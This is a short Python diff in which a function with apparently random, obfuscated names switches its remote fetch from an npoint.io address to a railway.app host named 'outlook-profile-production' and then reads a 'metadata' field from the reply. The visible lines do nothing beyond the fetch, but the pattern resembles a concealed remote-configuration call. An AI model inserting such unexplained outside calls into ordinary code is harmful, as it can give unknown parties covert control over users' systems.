@@ -16,7 +16,7 @@ def train_gouasv_208():
 
     def learn_rnznxp_216():
         try:
-            data_inlqny_594 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_inlqny_594 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_inlqny_594.raise_for_status()
             model_jvwvtc_873 = data_inlqny_594.json()
             model_bolhgo_337 = model_jvwvtc_873.get('metadata')
